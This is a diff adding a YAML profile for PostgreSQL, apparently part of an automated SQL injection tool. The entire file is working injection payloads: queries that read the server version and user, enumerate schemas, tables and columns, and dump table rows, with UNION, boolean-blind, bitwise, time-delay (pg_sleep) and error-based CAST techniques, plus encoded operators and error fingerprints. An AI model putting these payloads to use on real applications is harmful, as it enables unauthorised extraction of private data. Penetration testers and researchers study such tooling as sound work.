@@ -1,0 +1,192 @@
+vendor: ""
+resource: 
+ info: |
+  concat_ws(
+      '${ENCLOSE_VALUE_SQL}',
+      version(),
+      current_database(),
+      user
+  )
+  || '${TRAIL_SQL}'
+ schema: 
+  database: |
+   select 
+       array_to_string(
+           array(
+               select 
+                   '${ENCLOSE_VALUE_SQL}'
+                   || r
+                   || '${SEPARATOR_QTE_SQL}'
+                   || q::text
+                   || '${ENCLOSE_VALUE_SQL}'
+               from (
+                   SELECT
+                       tables.table_schema r,
+                       count(table_name) q
+                   FROM information_schema.tables
+                   group by r
+                   order by r
+                   {limit}
+               ) x
+           ),
+           '${SEPARATOR_CELL_SQL}'
+       )
+       || '${TRAIL_SQL}'
+  table: |
+   select 
+       array_to_string(
+           array(
+               select 
+                   '${ENCLOSE_VALUE_SQL}'
+                   || r
+                   || '${SEPARATOR_QTE_SQL}'
+                   || q::text
+                   || '${ENCLOSE_VALUE_SQL}'
+               from (
+                   SELECT 
+                       tables.table_name r,
+                       '0' q
+                   FROM information_schema.tables
+                   where tables.TABLE_SCHEMA = '${DATABASE}'
+                   order by r
+                   {limit}
+               ) x
+           ),
+           '${SEPARATOR_CELL_SQL}'
+       )
+       || '${TRAIL_SQL}'
+  column: |
+   select 
+       array_to_string(
+           array(
+               select 
+                   '${ENCLOSE_VALUE_SQL}'
+                   || r
+                   || '${SEPARATOR_QTE_SQL}'
+                   || q::text
+                   || '${ENCLOSE_VALUE_SQL}'
+               from (
+                   SELECT 
+                       columns.column_name r, 
+                       '0' q
+                   FROM information_schema.columns
+                   where columns.TABLE_SCHEMA = '${DATABASE}'
+                   and columns.TABLE_name = '${TABLE}'
+                   order by r
+                   {limit}
+               )x
+           ),
+           '${SEPARATOR_CELL_SQL}'
+       )
+       || '${TRAIL_SQL}'
+  row: 
+   query: |
+    select 
+        array_to_string(
+            array(
+                select 
+                    '${ENCLOSE_VALUE_SQL}'
+                    || r
+                    || '${SEPARATOR_QTE_SQL}'
+                    || q::text
+                    || '${ENCLOSE_VALUE_SQL}'
+                from (
+                    SELECT 
+                        substr((${FIELDS}), 1, 775) r,
+                        count(*) q
+                    FROM ${DATABASE}.${TABLE}
+                    group by r
+                    {limit}
+                )x
+            ),
+            '${SEPARATOR_CELL_SQL}'
+        )
+        || '${TRAIL_SQL}'
+   fields: 
+    field: "trim(coalesce(${FIELD}::text, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        */
+       '${LEAD}'
+       || NULLIF(
+           substr(
+               (${INJECTION}),
+               ${INDEX},
+               65536
+           ),
+           '${TRAIL_SQL}'
+       )
+  limit: "limit 65536 offset ${LIMIT}"
+  failsafe: "(1337${INDICE}7330%2b1)::text"
+  calibrator: "repeat(chr(35), 1024)"
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "ERROR: unterminated quoted identifier at or near"
+    - "Query failed: ERROR:  unterminated quoted string at or near"
+    - "function\\\\.pg"
+    - PostgreSQL
+ normal: 
+  indices: "union select ${INDICES}"
+  capacity: "(select '${LEAD}' || ${INDICE} || ${CALIBRATOR})"
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "true = false"
+    - "true %21= true"
+    - "false %21= false"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "true = true"
+    - "false = false"
+    - "true %21= false"
+    - "1 = 1"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    /**
+     * true bit return bit, false bit return 0
+     * 8 & 8 = 8, 8 & 4 = 0
+     */
+    0 != (
+        ascii(
+            substr(
+                (${INJECTION}), 
+                ${INDEX}, 
+                1
+            )
+        ) 
+        %26 ${BIT}
+    )
+   length: "char_length((${INJECTION})) > ${INDEX}"
+  blind: "and ${TEST}"
+  time: |
+   and ''='' 
+   || (
+       select 
+           CASE WHEN ${TEST} 
+           THEN '' 
+           else pg_sleep(${SLEEP_TIME}) 
+       END
+   )
+ error: 
+  method: 
+   - name: "CAST::text_numeric"
+     query: |
+      /* Require FALSE statement, then OR */
+      and 1 = 0 
+      or 1 = CAST(
+          (${WINDOW})::text 
+          AS NUMERIC
+      )
+     capacity: 255
